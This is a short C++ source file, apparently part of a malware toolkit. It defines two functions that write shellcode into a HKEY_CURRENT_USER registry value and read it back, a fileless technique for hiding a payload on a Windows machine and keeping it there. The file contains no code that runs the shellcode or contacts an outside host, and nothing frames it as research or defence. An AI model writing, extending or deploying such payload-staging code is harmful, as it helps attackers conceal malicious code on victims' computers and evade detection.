#include "registry_utils.h"
#include <windows.h>
#include <iostream>

bool WriteShellcodeToRegistry(const std::string& key, const std::string& valueName, const BYTE* data, DWORD dataSize) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key for writing.\n";
        return false;
    }

    if (RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY, data, dataSize) != ERROR_SUCCESS) {
        std::cerr << "Failed to write to registry.\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

bool ReadShellcodeFromRegistry(const std::string& key, const std::string& valueName, BYTE* buffer, DWORD bufferSize) {
    HKEY hKey;
    DWORD type = REG_BINARY;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key for reading.\n";
        return false;
    }

    if (RegGetValueA(hKey, NULL, valueName.c_str(), RRF_RT_REG_BINARY, &type, buffer, &bufferSize) != ERROR_SUCCESS) {
        std::cerr << "Failed to read from registry.\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}
